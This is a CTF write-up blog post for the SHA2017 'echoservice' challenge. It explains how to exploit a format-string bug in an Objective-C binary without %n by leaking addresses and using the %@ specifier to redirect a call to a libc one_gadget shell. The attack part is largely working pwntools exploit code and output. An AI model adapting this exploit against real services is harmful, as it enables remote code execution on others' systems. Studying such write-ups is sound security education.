@@ -1,0 +1,522 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="HandheldFriendly" content="True">
+<meta name="MobileOptimized" content="320">
+<meta name="theme-color" content="#2ecc71">
+
+
+
+
+
+<title>SHA2017 CTF - echoservice | kileak</title>
+
+
+
+
+
+<meta name="description" content="SHA2017 CTF - echoservice">
+
+
+<meta name="keywords" content="SHA2017">
+
+
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+
+
+
+
+
+
+<link rel="canonical" href="https://kileak.github.io/ctf/2017/SHA-EchoService/">
+<link rel="alternate" type="application/rss+xml" title="kileak" href="https://kileak.github.io/feed.xml" />
+
+
+
+<!-- Google tag (gtag.js) -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-4PGFKKP0QW"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-4PGFKKP0QW');
+</script>
+
+
+<script>base_url = "";</script>
+
+  </head>
+  <body class="">
+
+    <main class="main-container">
+
+        <header class="site-header">
+
+  <div class="container txt-center">
+    <a href="#" class="nav-toogle js-menu-trigger sliding-panel-button">
+      <span></span>
+      <span></span>
+      <span></span>
+    </a>
+
+    <nav class="js-menu sliding-panel-content">
+      <ul>
+        <li><a href="/">home</a></li>
+        <li><a href="https://www.youtube.com/channel/UCi-IXmtQLrJjg5Ji78DqvAg/videos" target="_blank">youtube</a></li>
+        <li><a href="/feed.xml" target="_blank"><i class="icon icon-feed"></i> feed</a></li>
+      </ul>
+    </nav>
+    <div class="js-menu-screen sliding-panel-fade-screen"></div>
+
+    <a href="/" class="author-thumb dot">
+      <img src="/images/author.jpg" alt="Author thumbnail" class="dot">
+    </a>
+
+    <!--
+    <a href="https://www.youtube.com/channel/UCi-IXmtQLrJjg5Ji78DqvAg/videos" target="_blank" class="youtube-thumb dot">
+      <img src="/images/youtube-icon.png" alt="Youtube" class "dot">
+    </a>
+    -->
+
+    
+      <h1 class="post-title">SHA2017 CTF - echoservice</h1>
+      <p class="post-meta">Aug 6, 2017</p>
+    
+
+  </div>
+
+</header>
+
+
+        <section class="main-content">
+          <article class="post">
+
+  <div class="post-content container">
+    <blockquote>
+  <p>Echo Service (400) - 11 solves
+<!--break--></p>
+
+  <p>No %n for you
+nc echo.stillhackinganyway.nl 1337</p>
+
+  <p>Attachment: <a href="https://kileak.github.io/assets/echoservice/echoservice">echoservice</a> <a href="https://kileak.github.io/assets/echoservice/libc.so.6">libc.so.6</a> <a href="https://kileak.github.io/assets/echoservice/xpl.py">xpl.py</a></p>
+</blockquote>
+
+<p>At first glance, this binary is exactly what it’s name tells us: an echoservice.</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">$ ./echoservice
+AAAABBBB
+2017-08-06 19:53:00.132 echoservice[13577:13577] AAAABBBB
+%p.%p.%p.%p
+2017-08-06 19:53:09.371 echoservice[13577:13577] (null).(null).0x55555593c9c0.0x55555593c6c0
+%10$n
+2017-08-06 19:54:37.983 echoservice[13577:13577] %n is for n00bs! Let's see how you do without it...</code></pre></figure>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">CANARY    : ENABLED
+FORTIFY   : disabled
+NX        : ENABLED
+PIE       : ENABLED
+RELRO     : FULL</code></pre></figure>
+
+<p>So, it seems to be vulnerable to format string attacks, but like the challenge description already stated, we won’t be able to use <code class="language-plaintext highlighter-rouge">%n</code>.</p>
+
+<p>Ok, this might get interesting. But for a start, just let’s use the format string in the casual manner to leak some addresses. Since PIE and ASLR is active, we’ll sure need some later on.</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="c1">#!/usr/bin/python
+</span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="kn">import</span> <span class="nn">sys</span>
+
+<span class="n">LOCAL</span> <span class="o">=</span> <span class="bp">True</span>
+
+<span class="n">HOST</span> <span class="o">=</span> <span class="s">"echo.stillhackinganyway.nl"</span>
+<span class="n">PORT</span> <span class="o">=</span> <span class="mi">1337</span>
+
+<span class="k">def</span> <span class="nf">readValue</span><span class="p">(</span><span class="n">param</span><span class="p">):</span>
+	<span class="k">global</span> <span class="n">PARAMOFF</span>
+
+	<span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"%%%d$p"</span> <span class="o">%</span> <span class="p">(</span><span class="n">param</span><span class="p">))</span>
+	<span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"]"</span><span class="p">)</span>
+	<span class="n">LEAK</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">r</span><span class="p">.</span><span class="n">recvline</span><span class="p">().</span><span class="n">strip</span><span class="p">(),</span> <span class="mi">16</span><span class="p">)</span>
+
+	<span class="k">return</span> <span class="n">LEAK</span>
+
+<span class="k">def</span> <span class="nf">exploit</span><span class="p">(</span><span class="n">r</span><span class="p">):</span>
+	<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Leak PIE address"</span><span class="p">)</span>
+
+	<span class="n">PIELEAK</span> <span class="o">=</span> <span class="n">readValue</span><span class="p">(</span><span class="mi">6</span><span class="p">)</span>
+	<span class="n">PIE</span> <span class="o">=</span> <span class="n">PIELEAK</span> <span class="o">-</span> <span class="mh">0x2023a0</span>
+	
+	<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Leak LIBC address"</span><span class="p">)</span>	
+	
+	<span class="n">LIBCLEAK</span> <span class="o">=</span> <span class="n">readValue</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+	<span class="n">LIBC</span> <span class="o">=</span> <span class="n">LIBCLEAK</span> <span class="o">-</span> <span class="mh">0x3c4b40</span>
+	<span class="n">BINSH</span> <span class="o">=</span> <span class="n">LIBC</span> <span class="o">+</span> <span class="mh">0x18cd17</span>
+	
+	<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Leak HEAP address"</span><span class="p">)</span>
+
+	<span class="n">HEAPLEAK</span> <span class="o">=</span> <span class="n">readValue</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span>
+
+	<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"PIE leak       : %s"</span> <span class="o">%</span> <span class="nb">hex</span><span class="p">(</span><span class="n">PIELEAK</span><span class="p">))</span>
+	<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"PIE base       : %s"</span> <span class="o">%</span> <span class="nb">hex</span><span class="p">(</span><span class="n">PIE</span><span class="p">))</span>
+	<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"LIBC leak      : %s"</span> <span class="o">%</span> <span class="nb">hex</span><span class="p">(</span><span class="n">LIBCLEAK</span><span class="p">))</span>
+	<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"LIBC base      : %s"</span> <span class="o">%</span> <span class="nb">hex</span><span class="p">(</span><span class="n">LIBC</span><span class="p">))</span>
+	<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"HEAP leak      : %s"</span> <span class="o">%</span> <span class="nb">hex</span><span class="p">(</span><span class="n">HEAPLEAK</span><span class="p">))</span>
+
+<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">"__main__"</span><span class="p">:</span>	
+	<span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">1</span><span class="p">:</span>
+		<span class="n">LOCAL</span> <span class="o">=</span> <span class="bp">False</span>
+		<span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="n">HOST</span><span class="p">,</span> <span class="n">PORT</span><span class="p">)</span>
+		<span class="n">exploit</span><span class="p">(</span><span class="n">r</span><span class="p">)</span>
+	<span class="k">else</span><span class="p">:</span>	
+		<span class="n">LOCAL</span> <span class="o">=</span> <span class="bp">True</span>
+		<span class="n">r</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s">"/echoservice"</span><span class="p">,</span> <span class="n">env</span><span class="o">=</span><span class="p">{</span><span class="s">"LD_PRELOAD"</span><span class="p">:</span><span class="s">"./libc.so.6"</span><span class="p">})</span>
+		<span class="k">print</span> <span class="n">util</span><span class="p">.</span><span class="n">proc</span><span class="p">.</span><span class="n">pidof</span><span class="p">(</span><span class="n">r</span><span class="p">)</span>
+		<span class="n">pause</span><span class="p">()</span>
+		<span class="n">exploit</span><span class="p">(</span><span class="n">r</span><span class="p">)</span></code></pre></figure>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">$ python xpl.py 1
+[+] Opening connection to echo.stillhackinganyway.nl on port 1337: Done
+[*] Leak PIE address
+[*] Leak LIBC address
+[*] Leak HEAP address
+[*] PIE leak       : 0x55ae73fee3a0
+[*] PIE base       : 0x55ae73dec000
+[*] LIBC leak      : 0x7f3715bd3b40
+[*] LIBC base      : 0x7f371580f000
+[*] HEAP leak      : 0x55ae75afce90</code></pre></figure>
+
+<p>Ok, with this out of way… How can this be exploitable without being able to overflow a buffer or using <code class="language-plaintext highlighter-rouge">%n</code>.</p>
+
+<p>Well, that stumped me a while, but after reversing the binary, the idea arose, that this might have something to do with the <code class="language-plaintext highlighter-rouge">objective c</code> implementation for format strings.</p>
+
+<p>And yes, they added an additional format string parameter : <code class="language-plaintext highlighter-rouge">%@</code></p>
+
+<p>From the apple developer reference:</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">%@
+Objective-C object, printed as the string returned by descriptionWithLocale: if available, or description otherwise. 
+Also works with CFTypeRef objects, returning the result of the CFCopyDescription function.</code></pre></figure>
+
+<p>Let’s give it a try.</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">$ ./echoservice
+%13$p   AAAABBBB
+2017-08-06 20:17:30.465 echoservice[20474:20474] 0x4242424241414141   AAAABBBB
+%13$@   AAAABBBB
+Segmentation fault</code></pre></figure>
+
+<p>Well, doesn’t this look intriguing?</p>
+
+<p>Analyzing it in <code class="language-plaintext highlighter-rouge">gdb</code>, shows, that it breaks in <code class="language-plaintext highlighter-rouge">objc_msg_lookup</code> trying to dereference our input string and stuffing it into <code class="language-plaintext highlighter-rouge">rbp</code></p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">RAX: 0xc0 
+RBX: 0x0 
+RCX: 0x7fffffffc570 --&gt; 0x9203d20f7dd3b40 
+RDX: 0x0 
+RSI: 0x7ffff7901990 --&gt; 0x1300000003 
+RDI: 0x4242424241414141 ('AAAABBBB')
+RBP: 0x7fffffffd6f0 --&gt; 0x7fffffffe790 --&gt; 0x5555557d8fb0 --&gt; 0x7ffff790fa00 --&gt; 0x7ffff790fc40 --&gt; 0x7ffff72129e0 (0x00007ffff72129e0)
+RSP: 0x7fffffffc530 ("ng = \t\t\"")
+RIP: 0x7ffff7008b63 --&gt; 0x8b48068b482f8b48 
+R8 : 0x0 
+R9 : 0x1e 
+R10: 0x20 (' ')
+R11: 0x0 
+R12: 0xffffffffffffffff 
+R13: 0x4242424241414141 ('AAAABBBB')
+R14: 0x7fffffffc6a0 --&gt; 0xffffffff 
+R15: 0x7fffffffd700 --&gt; 0x7ffff79110c0 --&gt; 0x7ffff79116e0 --&gt; 0x7ffff72129e0 (0x00007ffff72129e0)
+EFLAGS: 0x10206 (carry PARITY adjust zero sign trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+   0x7ffff7008b5d &lt;objc_msg_lookup+13&gt;:	push   rbp
+   0x7ffff7008b5e &lt;objc_msg_lookup+14&gt;:	push   rbx
+   0x7ffff7008b5f &lt;objc_msg_lookup+15&gt;:	sub    rsp,0x8
+=&gt; 0x7ffff7008b63 &lt;objc_msg_lookup+19&gt;:	mov    rbp,QWORD PTR [rdi]
+   0x7ffff7008b66 &lt;objc_msg_lookup+22&gt;:	mov    rax,QWORD PTR [rsi]
+   0x7ffff7008b69 &lt;objc_msg_lookup+25&gt;:	mov    rdx,QWORD PTR [rbp+0x40]
+   0x7ffff7008b6d &lt;objc_msg_lookup+29&gt;:	mov    r8d,eax
+   0x7ffff7008b70 &lt;objc_msg_lookup+32&gt;:	mov    rcx,rax</code></pre></figure>
+
+<p>Since we control <code class="language-plaintext highlighter-rouge">rdi</code>, we can also control the value <code class="language-plaintext highlighter-rouge">rbp</code> will get. Let’s start forging a frame for setting the registers.</p>
+
+<p>Searching our input string on the heap and calculating it’s offset from the leaked heap address gives us a base address to work with.</p>
+
+<p>From here on, it’s just some debugging work, finding the correct offsets for our variables and build a frame on the heap, so that the registers get overwritten with the correct pointers.</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">HEAPBASE</span> <span class="o">=</span> <span class="n">HEAPLEAK</span> <span class="o">-</span> <span class="mh">0x93cc8</span>
+
+<span class="n">payload</span> <span class="o">=</span> <span class="s">"%13$@   "</span>	
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">HEAPBASE</span> <span class="o">+</span> <span class="mh">0x8</span><span class="p">)</span>       <span class="c1"># RDI
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">HEAPBASE</span> <span class="o">+</span> <span class="mh">0x10</span><span class="p">)</span>      <span class="c1"># RBP
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="s">"Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae"</span></code></pre></figure>
+
+<p>Let’s highlight the interesting parts from <code class="language-plaintext highlighter-rouge">objc_msg_lookup</code>, which will get called in one print call</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">0x7ffff7008b63 &lt;objc_msg_lookup+19&gt;:    mov    rbp,QWORD PTR [rdi]
+0x7ffff7008b66 &lt;objc_msg_lookup+22&gt;:    mov    rax,QWORD PTR [rsi]
+0x7ffff7008b69 &lt;objc_msg_lookup+25&gt;:    mov    rdx,QWORD PTR [rbp+0x40]</code></pre></figure>
+
+<p>Again, since we control <code class="language-plaintext highlighter-rouge">rdi</code>, we control from where <code class="language-plaintext highlighter-rouge">rbp</code> gets filled. We aren’t able to influence <code class="language-plaintext highlighter-rouge">rax</code>at this point, but <code class="language-plaintext highlighter-rouge">rdx</code> gets filled from <code class="language-plaintext highlighter-rouge">rbp+0x40</code> , so we’ll be able to control the value for <code class="language-plaintext highlighter-rouge">rdx</code> also.</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">[----------------------------------registers-----------------------------------]
+RAX: 0x3 
+RCX: 0x13 
+[-------------------------------------code-------------------------------------]
+   0x7ffff7008ba0 &lt;objc_msg_lookup+80&gt;:	mov    r8,QWORD PTR [rdx]
+   0x7ffff7008ba3 &lt;objc_msg_lookup+83&gt;:	mov    eax,eax
+=&gt; 0x7ffff7008ba5 &lt;objc_msg_lookup+85&gt;:	mov    rax,QWORD PTR [r8+rax*8]
+   0x7ffff7008ba9 &lt;objc_msg_lookup+89&gt;:	mov    rax,QWORD PTR [rax+rcx*8]</code></pre></figure>
+
+<p>And here it goes on. Since we control <code class="language-plaintext highlighter-rouge">rdx</code> we control <code class="language-plaintext highlighter-rouge">r8</code>. <code class="language-plaintext highlighter-rouge">rax</code> will be <code class="language-plaintext highlighter-rouge">0x3</code> and <code class="language-plaintext highlighter-rouge">rcx</code> will be <code class="language-plaintext highlighter-rouge">0x13</code> at this point.</p>
+
+<p>By knowing this and controlling <code class="language-plaintext highlighter-rouge">r8</code>, we’re also controlling <code class="language-plaintext highlighter-rouge">rax</code>…</p>
+
+<p>And now something beautiful happens :)</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">[----------------------------------registers-----------------------------------]
+RAX: 0xdeadbeef 
+RBX: 0x0 
+RCX: 0x13 
+RDX: 0x7ffff7901980 --&gt; 0x1c00000006 
+RSI: 0x7ffff7901990 --&gt; 0x1300000003 
+RDI: 0x55555582c470 --&gt; 0x55555582c478 ('A' &lt;repeats 64 times&gt;, "\300ĂUUU")
+RBP: 0x7fffffffd6f0 --&gt; 0x7fffffffe790 --&gt; 0x5555557d8fb0 --&gt; 0x7ffff790fa00 --&gt; 0x7ffff790fc40 --&gt; 0x7ffff72129e0 (0x00007ffff72129e0)
+RSP: 0x7fffffffc570 --&gt; 0x9203d20f7dd3b40 
+RIP: 0x7ffff7398871 --&gt; 0x1565840fc084 
+R8 : 0x55555582c4c8 ('B' &lt;repeats 24 times&gt;, "hĂUUU")
+R9 : 0x1e 
+R10: 0x20 (' ')
+R11: 0x0 
+R12: 0xffffffffffffffff 
+R13: 0x55555582c470 --&gt; 0x55555582c478 ('A' &lt;repeats 64 times&gt;, "\300ĂUUU")
+R14: 0x7fffffffc6a0 --&gt; 0xffffffff 
+R15: 0x7fffffffd700 --&gt; 0x7ffff79110c0 --&gt; 0x7ffff79116e0 --&gt; 0x7ffff72129e0 (0x00007ffff72129e0)
+EFLAGS: 0x10202 (carry parity adjust zero sign trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+   0x7ffff7398865:	lea    rsi,[rip+0x569124]        # 0x7ffff7901990
+   0x7ffff739886c:	mov    rdi,r13
+=&gt; 0x7ffff739886f:	call   rax
+   0x7ffff7398871:	test   al,al
+   0x7ffff7398873:	je     0x7ffff7399dde
+   0x7ffff7398879:	lea    rsi,[rip+0x569120]        # 0x7ffff79019a0
+   0x7ffff7398880:	mov    rdi,r13
+   0x7ffff7398883:	call   0x7ffff73820a0
+[------------------------------------stack-------------------------------------]</code></pre></figure>
+
+<p>Calling <code class="language-plaintext highlighter-rouge">rax</code>…</p>
+
+<p>Though we cannot overwrite an specific address in memory like we would have done with <code class="language-plaintext highlighter-rouge">%n</code>, but that shiny new format string parameter allows us to call a function instead.</p>
+
+<p>So our payload for setting up a frame to get to this call looks like this:</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">payload</span> <span class="o">=</span> <span class="s">"%13$@   "</span>	
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">HEAPBASE</span> <span class="o">+</span> <span class="mh">0x8</span><span class="p">)</span>       <span class="c1"># RDI
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">HEAPBASE</span> <span class="o">+</span> <span class="mh">0x10</span><span class="p">)</span>      <span class="c1"># RBP
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="s">"A"</span><span class="o">*</span><span class="mi">64</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">HEAPBASE</span> <span class="o">+</span> <span class="mh">0x58</span><span class="p">)</span>      <span class="c1"># RDX
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">HEAPBASE</span> <span class="o">+</span> <span class="mh">0x60</span><span class="p">)</span>      <span class="c1"># R8
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="s">"B"</span><span class="o">*</span><span class="mi">24</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">HEAPBASE</span><span class="p">)</span>             <span class="c1"># RAX
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="s">"A"</span><span class="o">*</span><span class="mi">24</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xdeadbeef</span><span class="p">)</span>           <span class="c1"># RIP</span></code></pre></figure>
+
+<p>We should be able to use a magic gadget now to trigger a shell. On my local machine, none of the constraints for <code class="language-plaintext highlighter-rouge">one_gadget</code> could be satisfied, since my stack was filled with junk.</p>
+
+<p>I just added a call to the function, which reads our input, thus creating a new stack frame and now successfully executing the magic gadget.</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">ONE</span> <span class="o">=</span> <span class="n">LIBC</span> <span class="o">+</span> <span class="mh">0x4526a</span>
+<span class="n">CALLREAD</span> <span class="o">=</span> <span class="n">PIE</span> <span class="o">+</span> <span class="mh">0xF92</span>
+
+<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Calling read function to create new stack frame"</span><span class="p">)</span>
+
+<span class="n">payload</span> <span class="o">=</span> <span class="s">"%13$@   "</span>	
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">HEAPBASE</span> <span class="o">+</span> <span class="mh">0x8</span><span class="p">)</span>       <span class="c1"># RDI
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">HEAPBASE</span> <span class="o">+</span> <span class="mh">0x10</span><span class="p">)</span>      <span class="c1"># RBP	
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="s">"A"</span><span class="o">*</span><span class="mi">64</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">HEAPBASE</span> <span class="o">+</span> <span class="mh">0x58</span><span class="p">)</span>      <span class="c1"># RDX	
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">HEAPBASE</span> <span class="o">+</span> <span class="mh">0x60</span><span class="p">)</span>      <span class="c1"># R8	
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="s">"B"</span><span class="o">*</span><span class="mi">24</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">HEAPBASE</span><span class="p">)</span>             <span class="c1"># RAX	
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="s">"A"</span><span class="o">*</span><span class="mi">24</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">CALLREAD</span><span class="p">)</span>             <span class="c1"># RIP
+</span>	
+<span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+
+<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Calling one gadget to trigger shell"</span><span class="p">)</span>
+
+<span class="n">payload</span> <span class="o">=</span> <span class="s">"%13$@   "</span>	
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">HEAPBASE</span> <span class="o">+</span> <span class="mh">0x8</span><span class="p">)</span>       <span class="c1"># RDI
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">HEAPBASE</span> <span class="o">+</span> <span class="mh">0x10</span><span class="p">)</span>      <span class="c1"># RBP	
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="s">"A"</span><span class="o">*</span><span class="mi">64</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">HEAPBASE</span> <span class="o">+</span> <span class="mh">0x58</span><span class="p">)</span>      <span class="c1"># RDX	
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">HEAPBASE</span> <span class="o">+</span> <span class="mh">0x60</span><span class="p">)</span>      <span class="c1"># R8	
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="s">"B"</span><span class="o">*</span><span class="mi">24</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">HEAPBASE</span><span class="p">)</span>             <span class="c1"># RAX	
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="s">"A"</span><span class="o">*</span><span class="mi">24</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">ONE</span><span class="p">)</span>                  <span class="c1"># RIP
+</span>	
+<span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span></code></pre></figure>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">$ python xpl.py 
+[+] Starting local process '/echoservice': pid 5602
+[5602]
+[*] Paused (press any to continue)
+[*] Leak PIE address
+[*] Leak LIBC address
+[*] Leak HEAP address
+[*] PIE leak       : 0x5555557563a0
+[*] PIE base       : 0x555555554000
+[*] LIBC leak      : 0x7ffff7dd3b40
+[*] LIBC base      : 0x7ffff7a0f000
+[*] HEAP leak      : 0x5555558c0130
+[*] HEAP base      : 0x55555582c468
+[*] Calling read function to create new stack frame
+[*] Calling one gadget to trigger shell
+[*] Switching to interactive mode
+$ whoami
+kileak</code></pre></figure>
+
+<p>A local shell popping up… Victory within reach… But… remote service says <code class="language-plaintext highlighter-rouge">no</code> =(</p>
+
+<p>This took me quite a while to fix. It turned out, that the heap structure on the remote machine was different, and so our frame on the heap wasn’t stored at the same offset from the leaked heap address.</p>
+
+<p>In despair, I wrote a “<code class="language-plaintext highlighter-rouge">heap scanner</code>”, putting 1000 <code class="language-plaintext highlighter-rouge">A</code>’s on the heap, and tried to find them with <code class="language-plaintext highlighter-rouge">%13$s</code></p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">for i in range(1000, 2000):
+    payload = "%13$s   "
+    payload += p64(HEAPLEAK - (i*1000))	
+    payload += "A"*1000
+
+    r.sendline(payload)
+    resp = r.recvline()
+
+    if "AAA" in resp:
+    	print "Found payload at: %d" % i
+    	break</code></pre></figure>
+
+<p>Not a very clean method, but with this, I was able to find the payload on the heap again. Whilst becoming desparate, not getting the exploit working, I also had rearranged the frame.</p>
+
+<p>Resulting in this final payload:</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">ONE</span> <span class="o">=</span> <span class="n">LIBC</span> <span class="o">+</span> <span class="mh">0x4526a</span>
+<span class="n">HEAPBASE</span> <span class="o">=</span> <span class="n">HEAPLEAK</span> <span class="o">-</span> <span class="p">(</span><span class="mi">1139</span><span class="o">*</span><span class="mi">1000</span><span class="p">)</span><span class="o">-</span><span class="mi">72</span>
+
+<span class="n">payload</span> <span class="o">=</span> <span class="s">"%13$@   "</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">HEAPBASE</span><span class="o">+</span><span class="mh">0x28</span><span class="p">)</span>   <span class="c1"># RDI	
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="s">"A"</span><span class="o">*</span><span class="p">(</span><span class="mi">8</span><span class="o">*</span><span class="mi">5</span><span class="p">)</span>			
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">HEAPBASE</span><span class="o">+</span><span class="mh">0x20</span><span class="p">)</span>   <span class="c1"># RBP  
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="s">"B"</span><span class="o">*</span><span class="mi">48</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">HEAPBASE</span><span class="o">+</span><span class="mh">0x76</span><span class="p">)</span>   <span class="c1"># RDX	
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="s">"A"</span><span class="o">*</span><span class="mi">14</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">HEAPBASE</span><span class="o">+</span><span class="mh">0x76</span><span class="p">)</span>   <span class="c1"># R8 
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="s">"B"</span><span class="o">*</span><span class="mi">16</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">HEAPBASE</span><span class="o">+</span><span class="mh">0x20</span><span class="p">)</span>   <span class="c1"># RAX 
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="s">"CC"</span>	
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">ONE</span><span class="p">)</span><span class="o">*</span><span class="mi">5</span>           <span class="c1"># RIP 
+</span>
+<span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+
+<span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"cat flag"</span><span class="p">)</span>
+
+<span class="n">r</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span></code></pre></figure>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">$ python xpl.py  1
+[+] Opening connection to echo.stillhackinganyway.nl on port 1337: Done
+[*] Leak PIE address
+[*] Leak LIBC address
+[*] Leak HEAP address
+[*] PIE leak       : 0x5629f62f43a0
+[*] PIE base       : 0x5629f60f2000
+[*] LIBC leak      : 0x7f3b7bfe8b40
+[*] LIBC base      : 0x7f3b7bc24000
+[*] HEAP leak      : 0x5629f680ce90
+[*] HEAP base      : 0x5629f67791f0
+[*] Calling read function to create new stack frame
+[*] Switching to interactive mode
+flag{32ee124c49e3de4555b0f1c063539ef0}</code></pre></figure>
+
+<p>Quite a ride, but really enjoyed this challenge…</p>
+
+
+    <aside class="share">
+
+      <span>Share this: </span>
+
+      <a href="http://twitter.com/share?text=SHA2017 CTF - echoservice&amp;url=https://kileak.github.io/ctf/2017/SHA-EchoService/"
+      onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
+        <i class="icon icon-twitter-rounded"></i>
+      </a>
+
